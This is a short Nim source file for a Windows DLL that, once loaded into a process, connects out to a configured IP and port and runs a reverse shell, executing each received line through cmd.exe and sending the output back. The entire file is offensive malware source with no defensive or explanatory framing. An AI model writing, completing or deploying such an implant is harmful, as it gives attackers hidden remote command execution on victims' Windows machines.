import winim/lean
import net, osproc, strformat

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    NimMain()

    if fdwReason == DLL_PROCESS_ATTACH:

        # variables
        let
            ip = ""
            port = 1488
            sock = newSocket()

        # connection
        while true:
            try:
                sock.connect(ip, Port(port))
            except:
                continue

            break
        
        # loop remote shell
        while true:
            send(sock)
            let args = recvLine(sock)

            # execute
            try:
                let cmd = execProcess(fmt"cmd.exe /c" & args)
                send(sock, cmd)

            # disconnect
            except:
                break

    return true
